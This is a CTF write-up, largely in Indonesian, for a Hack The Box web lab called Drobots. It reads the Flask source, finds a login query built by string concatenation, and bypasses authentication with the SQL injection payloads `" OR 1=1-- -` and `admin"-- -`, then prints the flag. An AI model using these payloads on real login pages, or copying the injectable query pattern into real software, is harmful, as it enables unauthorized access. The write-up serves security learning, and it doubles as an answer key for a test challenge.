Pandora’s latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was 
suspected of engaging in illegal activities.
Can you help pandora with this task?

![image](https://user-images.githubusercontent.com/113104087/230796933-1633c22a-d844-4fb7-ac8b-6a890adb9a01.png)


Reconn 

Home page:

![image](https://user-images.githubusercontent.com/113104087/230796965-e53a2997-0cce-4d98-be28-5c4f6e4f830b.png)


Di sini, kita melihat ada halaman login .
Ketika saya menangani halaman login, saya akan selalu mencoba melakukan injeksi SQL untuk melewati otentikasi.
simple payload `' OR 1=1-- -` :

![image](https://user-images.githubusercontent.com/113104087/230796998-1682a552-5322-4e04-8889-333a88bece33.png)


![image](https://user-images.githubusercontent.com/113104087/230797003-71e6282f-7180-459e-8dd1-ade4e3a56ac8.png)


Ah Tidak.
Mari kita baca source codenya !
Di `application/blueprints/routes.py`, kami melihat beberapa hal menarik:
```js
from flask import Blueprint, render_template, request, session, redirect
from application.database import login
from application.util import response, isAuthenticated
[...]
flag = open('/flag.txt').read()
[...]
@web.route('/home')
@isAuthenticated
def home():
    return render_template('home.html', flag=flag)
   ```
Rute `/home` (titik akhir) akan mengembalikan bendera . Namun, kita perlu diautentikasi !
```js
@api.route('/login', methods=['POST'])
def apiLogin():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login(username, password)
    
    if user:
        session['auth'] = user
        return response('Success'), 200
        
    return response('Invalid credentials!'), 403
```
Di dalam `/loginroute`, kita melihatnya menggunakan fungsi yang disebut `login()`, yaitu dari `application.database`:
```js
from colorama import Cursor
from application.util import createJWT
from flask_mysqldb import MySQL

mysql = MySQL()

def query_db(query, args=(), one=False):
    cursor = mysql.connection.cursor()
    cursor.execute(query, args)
    rv = [dict((cursor.description[idx][0], value)
        for idx, value in enumerate(row)) for row in cursor.fetchall()]
    return (rv[0] if rv else None) if one else rv


def login(username, password):
    # We should update our code base and use techniques like parameterization to avoid SQL Injection
    user = query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)

    if user:
        token = createJWT(username)
        return token
    else:
        return False
```
Dan oh! Ada komentar Python: "Kita harus memperbarui basis kode kita dan menggunakan teknik seperti parameterisasi untuk menghindari SQL Injection".
Seperti yang Anda lihat, kueri SQL digabungkan secara langsung tanpa menggunakan pernyataan persiapan `(parameterisasi)`, atau setidaknya disanitasi.
```
Eksploitasi
```
Karena itu, kita dapat melewati autentikasi dengan menggunakan payload berikut diusername field:
```
" OR 1=1-- -
```
Ini `"` untuk keluar dari string kueri. Sehingga kueri SQL yang disuntikkan akan menjadi:
Nama pengguna: `anything"` :
```
SELECT password FROM users WHERE username = "anything"" AND password = "password"
```
Kemudian, `OR 1=1` akan selalu dievaluasi menjadi True, yang berarti kita lolos pemeriksaan.
Selanjutnya, `-- -` adalah mengomentari sisa kueri SQL.
Karenanya, kueri SQL yang disuntikkan akan menjadi:
```
SELECT password FROM users WHERE username = "" OR 1=1-- -" AND password = "{password}"
```
Namun, alih-alih menggunakan `OR 1=1` , saya ingin mencoba sesuatu yang berbeda:
Karena itu, jika kita tahu nama pengguna yang benar, kita bisa masuk sebagai pengguna itu tanpa menggunakan `OR 1=1.`
Di `entrypoint.sh`, kami menemukan skema MySQL:
```js
function genPass() {
    echo -n $RANDOM | md5sum | head -c 32
}

mysql -u root << EOF
CREATE DATABASE drobots;
CREATE TABLE drobots.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    username varchar(255) NOT NULL UNIQUE,
    password varchar(255) NOT NULL
);
INSERT INTO drobots.users (username, password) VALUES ('admin', '$(genPass)');
CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$';
GRANT SELECT, INSERT, UPDATE ON drobots.users TO 'user'@'localhost';
FLUSH PRIVILEGES;
EOF
```
Di sini, kita melihat ada seorang pengguna bernama admin!!
Karena itu, kita dapat melewati autentikasi dan login sebagai admin!
payload : `admin"-- -`

![image](https://user-images.githubusercontent.com/113104087/230797318-3439ed07-dc8f-45ee-8e78-3a7e0bed8d27.png)


![image](https://user-images.githubusercontent.com/113104087/230797323-2a966605-dbb6-458f-9d0e-7c9ecbaebcfd.png)


Flag : `HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}`
